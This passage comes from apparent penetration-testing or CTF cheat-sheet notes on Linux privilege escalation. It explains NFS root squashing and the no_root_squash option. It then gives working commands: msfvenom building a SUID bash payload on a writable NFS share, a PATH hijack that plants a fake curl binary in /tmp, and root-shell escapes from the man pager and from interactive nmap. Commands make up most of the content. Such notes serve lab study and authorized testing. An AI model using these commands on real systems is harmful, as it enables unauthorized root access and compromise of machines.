mount -o rw,vers=2 <TARGET>:<SHARE> <LOCAL_DIRECTORY>
```

### Root squashing
Root Squashing is how NFS prevents an obvious privilege escalation. If the remote user is (or claims to be) root (uid=0), NFS will instead “squash” the user and treat them as if they are the “nobody” user, in the “nogroup” group. While this behavior is default, it can be disabled!

### No_root_squash
no_root_squash is an NFS configuration option which turns root squashing off. When included in a writable share configuration, a remote user who identifies as “root” can create files on the NFS share as the local root user.

Create payload to the mounted share and set SUID bit
```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf
```

## Tips and tricks
#### Exploiting path on binary
If a binary has a SUID and doesn’t use full path for executing something, you can manipulate the path to run another binary (/bin/sh).
- https://github.com/jondonas/linux-exploit-suggester-2
```
echo /bin/bash > /tmp/curl
chmod 777 /tmp/curl
export PATH=/tmp:$PATH
<path to binary>
```

#### Man pages
As the pager is being executed with root privileges, we can break out of the pager with a root shell. Go into man page and enter `
```
!/bin/bash
```
 
#### SUID nmap
```
nmap --interactive
!sh
whoami
#root
```
